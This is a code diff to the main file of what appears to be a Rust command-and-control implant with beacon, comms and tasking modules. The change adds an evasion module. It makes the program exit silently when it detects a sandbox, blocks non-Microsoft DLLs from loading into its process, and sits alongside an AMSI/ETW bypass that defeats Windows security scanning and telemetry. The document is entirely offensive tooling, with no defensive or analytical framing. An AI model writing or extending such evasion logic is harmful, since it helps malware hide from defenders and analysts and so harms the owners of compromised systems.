@@ -6,6 +6,7 @@
 mod beacon;
 mod comms;
 mod config;
+mod evasion;
 mod tasks;
 
 #[cfg(target_os = "windows")]
@@ -22,6 +23,16 @@ use anyhow::Result;
 #[tokio::main]
 async fn main() -> Result<()> {
     let cfg = config::load_embedded_config();
+
+    // Sandbox detection — exit silently if analysis environment detected.
+    if cfg.sandbox_evasion && evasion::is_sandbox() {
+        return Ok(());
+    }
+
+    // Block non-Microsoft DLLs from loading into this process.
+    if cfg.block_dlls {
+        evasion::apply_block_dlls();
+    }
 
     // Install HWBP-based AMSI/ETW bypass before anything else.
     #[cfg(target_os = "windows")]
